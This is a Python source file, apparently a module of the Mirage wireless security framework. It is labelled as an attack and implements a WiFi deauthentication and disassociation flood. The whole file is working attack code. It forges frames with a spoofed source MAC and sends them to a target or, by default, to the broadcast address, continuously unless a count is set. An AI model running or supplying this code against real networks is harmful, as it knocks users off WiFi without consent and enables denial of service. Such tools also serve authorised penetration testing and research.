from scapy.all import *
from mirage.core import module
from mirage.libs import utils, io, wifi

class wifi_deauth(module.WirelessModule):

    def init(self):
        self.technology = "wifi"
        self.type = "attack"
        self.description = "Deauthentication module for WiFi networks"

        self.args = {
            "SOURCE": "00:11:22:33:44:55",  # Source's address
            "TARGET": "FF:FF:FF:FF:FF:FF",  # Target's address
            "INTERFACE": "wlan0mon",  # Interface (monitor)
            "COUNT": "0",  # Packet number (0 = continuously send)
            "MODE": "both",  # "disassociation", "deauthentication", "both"
            "VERBOSE": "yes",
            "REASON": "7",
            "CHANNEL": "1"
        }
        self.dynamicArgs = False

    def checkCapabilities(self):
        return self.emitter.hasCapabilities(
            "COMMUNICATING_AS_STATION", "COMMUNICATING_AS_ACCESS_POINT", "MONITORING"
        )

    def send_deauth(self):
        packet_count = utils.integerArg(self.args["COUNT"])
        mode = self.args["MODE"].lower()
        verbose = utils.booleanArg(self.args['VERBOSE'])
        count = 0

        def send_packets():
            nonlocal count
            if mode in ["both", "deauthentication"]:
                self.emitter.sendp(self.deauth_packet)
            if mode in ["both", "disassociation"]:
                self.emitter.sendp(self.disas_packet)
            count += 1
            if count % 100 == 0 and verbose:
                io.info(f"Sent {count} deauthentication packets via {self.args['INTERFACE']}")

        while packet_count == 0 or count < packet_count:
            send_packets()
            utils.wait(seconds=0.05)

    def run(self):
        self.emitter = self.getEmitter(interface=self.args["INTERFACE"])
        if not self.checkCapabilities():
            io.fail(f"Interface provided ({self.args['INTERFACE']}) is not able to run in monitor mode.")
            return self.nok()

        if not utils.isNumber(self.args["CHANNEL"]):
            io.fail("You must provide a channel number.")
            return self.nok()

        self.target = self.args["TARGET"].upper() if self.args["TARGET"] else "FF:FF:FF:FF:FF:FF"
        if not self.args["TARGET"]:
            io.warning("No target provided, the attack is performed in broadcast.")
        else:
            io.info(f"Target provided: {self.target}")

        self.source = self.args["SOURCE"].upper()
        if not self.source:
            io.fail("You must provide a source address.")
            return self.nok()

        if not utils.isNumber(self.args["REASON"]):
            io.fail("You must provide a reason number.")
            return self.nok()
        self.reason = utils.integerArg(self.args["REASON"])

        self.emitter.setChannel(utils.integerArg(self.args["CHANNEL"]))

        # We forge the deauthentication and disassociation packet, while spoofing the client's MAC
        self.deauth_packet = wifi.WifiDeauth(destMac=self.target, srcMac=self.source, reason=self.reason)
        self.disas_packet = wifi.WifiDisas(destMac=self.target, srcMac=self.source, reason=self.reason)

        self.send_deauth()

        return self.ok()
